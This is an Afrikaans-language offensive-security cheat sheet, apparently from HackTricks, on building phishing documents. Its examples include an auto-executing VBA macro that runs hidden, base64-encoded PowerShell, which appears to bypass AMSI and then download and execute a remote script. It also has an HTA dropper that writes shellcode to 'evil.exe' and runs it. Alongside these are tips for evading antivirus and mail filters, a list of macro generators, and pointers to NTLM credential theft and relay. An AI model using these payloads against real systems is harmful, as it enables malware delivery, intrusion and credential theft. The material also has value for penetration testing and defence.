# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word voer lêerdata-validasie uit voordat 'n lêer geopen word. Data-validasie word uitgevoer in die vorm van data-struktuuridentifikasie, teen die OfficeOpenXML-standaard. As daar enige fout voorkom tydens die data-struktuuridentifikasie, sal die lêer wat geanaliseer word nie geopen word nie.

Gewoonlik gebruik Word-lêers wat makros bevat die `.docm` uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul makro-uitvoeringsvermoëns te behou.\
Byvoorbeeld, 'n RTF-lêer ondersteun nie makros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees om makros uit te voer.\
Die dieselfde interne meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om te kyk watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat 'n afstandsjabloon verwys (Lêer – Opsies – Byvoegings – Bestuur: Sjablone – Gaan) wat makros insluit, kan ook makros “uitvoer”.

### Eksterne Beeld Laai

Gaan na: _Invoeg --> Vinne Teile --> Veld_\
_**Kategoriene**: Skakels en Verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Makros Agterdeur

Dit is moontlik om makros te gebruik om arbitrêre kode vanaf die dokument uit te voer.

#### Outomatiese laai funksies

Hoe meer algemeen hulle is, hoe groter is die waarskynlikheid dat die AV hulle sal opspoor.

- AutoOpen()
- Document_Open()

#### Makros Kode Voorbeelde
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopbring. Klik op **Inspect** en dan op **Remove All** langs **Document Properties and Personal Information**.

#### Doc-uitbreiding

Wanneer jy klaar is, kies **Save as type** dropdown, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar is 'n **stigma** **rondom** die makro-geaktiveerde **`.docm`** uitbreiding (bv. die miniatuurikoon het 'n groot `!` en sommige web/e-pos poorte blokkeer hulle heeltemal). Daarom is hierdie **erf `.doc` uitbreiding die beste kompromie**.

#### Kwaadwillige Makro Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Lêers

'n HTA is 'n Windows-program wat **HTML en skripting tale (soos VBScript en JScript)** kombineer. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "volledig vertroude" toepassing, sonder die beperkings van 'n blaaiers sekuriteitsmodel.

'n HTA word uitgevoer met **`mshta.exe`**, wat tipies **geïnstalleer** word saam met **Internet Explorer**, wat **`mshta` afhanklik maak van IE**. So as dit verwyder is, sal HTA's nie in staat wees om uit te voer nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Dwing NTLM-outekenning

Daar is verskeie maniere om **NTLM-outekenning "afgeleë"** te **dwing**, byvoorbeeld, jy kan **on sigbare beelde** by e-posse of HTML voeg wat die gebruiker sal toegang hê tot (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **outekenning** net vir **die oopmaak van die gids** sal **aktiveer**.

**Kyk na hierdie idees en meer op die volgende bladsye:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moet nie vergeet dat jy nie net die hash of die outekenning kan steel nie, maar ook **NTLM relay-aanvalle** kan **uitvoer**:

- [**NTLM Relay-aanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
